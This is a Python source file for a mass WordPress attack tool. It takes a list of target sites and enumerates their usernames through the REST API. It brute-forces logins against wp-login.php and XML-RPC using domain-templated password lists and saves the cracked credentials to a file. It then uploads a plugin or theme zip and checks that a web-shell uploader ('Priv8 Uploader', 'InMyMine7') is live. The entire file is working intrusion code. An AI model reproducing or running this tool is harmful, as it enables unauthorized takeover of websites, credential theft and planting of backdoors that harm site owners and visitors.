import os
import sys
import ctypes
import ssl
import asyncio
import httpx
import warnings
import re
import random
from urllib.parse import urlparse
import datetime
import requests
from colorama import Fore, init, Style

from lib.tools.utils import banner, clear
from lib.tools.colors import wh, r, g, res, y
warnings.filterwarnings("ignore")


def load_local_ssl():
    dll_dir = os.path.dirname(os.path.abspath(__file__))
    try:
        if os.name == 'nt':  
            ctypes.WinDLL(os.path.join(dll_dir, 'lib/files/libeay32.dll'))
            ctypes.WinDLL(os.path.join(dll_dir, 'lib/files/ssleay32.dll'))
            print(f"{wh}[{g}INFO{wh}] Loaded local OpenSSL DLLs.")
    except Exception as e:
        print(f"{wh}[{y}WARNING{wh}] Failed to load local OpenSSL DLL: {e}")

load_local_ssl()

def verify_shell(url):
    try:
        resp = requests.get(url, timeout=10)
        if any(x in resp.text for x in ["InMyMine7", "Priv8 Uploader", "<form", "Upload"]):
            return True
        return False
    except Exception as e:
        print(f"{wh}[{r}ERROR{wh}] Shell verification failed: {e}")
        return False

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def random_name():
    let = "abcdefghijklmnopqrstuvwxyz1234567890"
    return ''.join(random.choice(let) for _ in range(8))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
]

class WPBrute:
    def __init__(self, targets, passwd_file):
        self.targets = targets
        self.passwd_file = passwd_file
        self.semaphore = asyncio.Semaphore(100)
        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

    async def is_wordpress(self, client, url):
        try:
            r = await client.get(f"{url}/wp-login.php", timeout=10)
            return "wordpress" in r.text.lower() or "wp-submit" in r.text.lower()
        except:
            return False

    async def try_login_wp(self, client, url, username, password):
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f'{url}/wp-admin/',
            'testcookie': '1'
        }
        try:
            r = await client.post(f"{url}/wp-login.php", data=login_data, timeout=15)
            if "wp-admin/profile.php" in r.text or "/wp-admin/" in str(r.url):
                return True
        except:
            pass
        return False

    async def try_login_xmlrpc(self, client, url, username, password):
        xml_body = f"""
        <?xml version="1.0"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value>{username}</value></param>
                <param><value>{password}</value></param>
            </params>
        </methodCall>
        """
        headers = {'Content-Type': 'text/xml'}
        try:
            r = await client.post(f"{url}/xmlrpc.php", data=xml_body.strip(), headers=headers, timeout=15)
            return "<member><name>isAdmin</name><value>" in r.text or "blogName" in r.text
        except:
            return False

    async def get_usernames(self, client, url):
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            r = await client.get(f"{url}/wp-json/wp/v2/users", headers=headers, timeout=15)
            usernames = re.findall(r'"slug":"(.*?)"', r.text)
            if not usernames:
                print(f"[username not found] {url}")
                return []
            print(f"[found username] {url}: {usernames}")
            return usernames
        except:
            print(f"[ERROR ON] {url}")
            return []

    async def upload_file(self, client, url, file_path, file_type):
        try:
            if file_type == "plugin":
                form_url = f"{url}/wp-admin/plugin-install.php?tab=upload"
                post_url = f"{url}/wp-admin/update.php?action=upload-plugin"
                form_field = "pluginzip"
                submit_field = "install-plugin-submit"
                folder_path = "wp-content/plugins/"
                output_file = "Result/plugins.txt"
            else:
                form_url = f"{url}/wp-admin/theme-install.php?tab=upload"
                post_url = f"{url}/wp-admin/update.php?action=upload-theme"
                form_field = "themezip"
                submit_field = "install-theme-submit"
                folder_path = "wp-content/themes/"
                output_file = "Result/themes.txt"

            r = await client.get(form_url, timeout=15)
            nonce_match = re.search(r'name="_wpnonce" value="(.*?)"', r.text)
            if not nonce_match:
                print(f"[FAILED] Unable to retrieve nonce from {url}")
                return False

            nonce = nonce_match.group(1)
            random_filename = random_name() + ".zip"

            with open(file_path, "rb") as f:
                files = {
                    form_field: (random_filename, f, "application/zip")
                }
                data = {
                    '_wpnonce': nonce,
                    '_wp_http_referer': f"/wp-admin/{'plugin' if file_type == 'plugin' else 'theme'}-install.php?tab=upload",
                    submit_field: 'Install Now'
                }
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                r = await client.post(post_url, data=data, files=files, headers=headers, timeout=30)

            if "successfully" in r.text.lower():
                name = os.path.splitext(random_filename)[0]
                full_url = f"{url}/{folder_path}{name}/install.php"
                if verify_shell(full_url):
                    print(f"[SUCCESS] Plugin successfully uploaded and active in {full_url}")
                print(f"[UPLOAD SUCCESS] {file_type.capitalize()}: {full_url}")
                with open(output_file, "a", encoding='utf-8', errors='ignore') as f:
                    f.write(f"{full_url}\n")
                return True
            elif "already exists" in r.text:
                print(f"[INFO] {file_type.capitalize()} it's already in {url}")
            else:
                print(f"[FAILED] Upload {file_type} failed to {url}")
        except Exception as e:
            print(f"[ERROR] Upload {file_type} error in {url}: {e}")
        return False

    async def handle_site(self, site):
        url = site.strip().rstrip('/')
        if not url.startswith("http"):
            url = "http://" + url

        async with self.semaphore:
            async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
                if not await self.is_wordpress(client, url):
                    print(f"[SKIP] Not a WordPress site: {url}")
                    return

                usernames = await self.get_usernames(client, url)
                if not usernames:
                    usernames = ["admin"]

                parsed_url = urlparse(url)
                domain = parsed_url.netloc

                for username in usernames:
                    logged_in = False
                    async for password in read_passwords_lazy(self.passwd_file):
                        real_password = password
                        real_password = real_password.replace("[WPLOGIN]", username)
                        real_password = real_password.replace("[UPPERLOGIN]", username.upper())
                        real_password = real_password.replace("[DOMAIN]", domain.split('.')[0])
                        real_password = real_password.replace("[DDOMAIN]", domain)
                        real_password = real_password.replace("[YEAR]", str(datetime.datetime.now().year))
                        real_password = real_password.replace("[UPPERALL]", username.upper())
                        real_password = real_password.replace("[LOWERALL]", username.lower())
                        real_password = real_password.replace("[UPPERONE]", username.capitalize())
                        real_password = real_password.replace("[LOWERONE]", username[0].lower() + username[1:].upper() if len(username) > 1 else username.lower())
                        real_password = real_password.replace("[AZDOMAIN]", re.sub(r'\W+', '', domain))
                        real_password = real_password.replace("[REVERSE]", username[::-1])
                        real_password = real_password.replace("[DVERSE]", domain.split('.')[0][::-1])
                        real_password = real_password.replace("[UPPERDO]", domain.capitalize().split('.')[0])
                        real_password = real_password.replace("[UPPERDOMAIN]", domain.upper())


                        success_wp = await self.try_login_wp(client, url, username, real_password)
                        success_xmlrpc = await self.try_login_xmlrpc(client, url, username, real_password)

                        if success_wp or success_xmlrpc:
                            print(f"[SUCCESS] {url} -> {username}:{real_password}")
                            with open("Result/success.txt", "a", encoding='utf-8', errors='ignore') as f:
                                f.write(f"{url} -> {username}:{real_password}\n")

                            plugin_uploaded = False
                            theme_uploaded = False

                            if os.path.exists("lib/files/plugin-inmymine.zip"):
                                plugin_uploaded = await self.upload_file(client, url, "lib/files/plugin-inmymine.zip", "plugin")
                            if os.path.exists("lib/files/theme-inmymine.zip"):
                                theme_uploaded = await self.upload_file(client, url, "lib/files/theme-inmymine.zip", "theme")

                            if not plugin_uploaded and not theme_uploaded:
                                with open("Result/failed.txt", "a", encoding='utf-8', errors='ignore') as f:
                                    f.write(f"{url}#upload_failed\n")
                            logged_in = True
                            break 
                        else:
                            print(f"[FAIL] {url} -> {username}:{real_password}")
                    if logged_in:
                        break 

    async def run(self):
        tasks = [self.handle_site(site) for site in self.targets]
        await asyncio.gather(*tasks)

def read_file(filename):
    with open(filename, encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def read_passwords_lazy(filename):
    async def generator():
        with open(filename, encoding='utf-8', errors='ignore') as f:
            for line in f:
                pw = line.strip()
                if pw:
                    yield pw
    return generator()

async def wp():
    clear()
    print(banner)
    print(f"{wh}[{g}INFO{wh}] OpenSSL Version: {ssl.OPENSSL_VERSION} \n")
    print(f"{wh}[{y}!{wh}] for password if u dont have u can use from (lib/files/password.txt)\n")

    target_file = input(f"{wh}[{g}+{wh}] Enter target list file: ").strip()
    if not target_file:
        print(f"{wh}[{r}!{wh}] [ERROR] No target file selected.")
        return
    if not os.path.isfile(target_file):
        print(f"{wh}[{r}!{wh}] [ERROR] File not found: {target_file}")
        return

    passwd_file = input(f"{wh}[{g}+{wh}] Enter password list file: ").strip()
    if not passwd_file:
        print(f"{wh}[{r}!{wh}] [ERROR] No password file selected.")
        return
    if not os.path.isfile(passwd_file):
        print(f"{wh}[{r}!{wh}] [ERROR] File not found: {passwd_file}")
        return

    targets = read_file(target_file)
    brute = WPBrute(targets, passwd_file)
    await brute.run()

if __name__ == "__main__":
    asyncio.run(wp())